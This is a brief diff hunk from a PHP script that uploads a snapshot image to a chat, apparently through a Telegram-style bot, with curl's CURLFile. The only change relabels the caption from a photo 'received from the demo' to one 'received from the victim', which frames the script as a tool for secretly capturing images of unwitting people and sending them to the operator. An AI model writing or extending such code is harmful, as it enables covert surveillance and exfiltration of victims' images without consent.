@@ -25,7 +25,7 @@ $tmp_path = $meta['uri'];
 
 $post_fields = [
     'chat_id' => $chat_id,
-    'caption' => "📷 Foto recibida desde la demo",
+    'caption' => "📷 Foto recibida de la victima!!!",
     'photo'   => new CURLFile($tmp_path, 'image/png', 'snapshot.png')
 ];
 
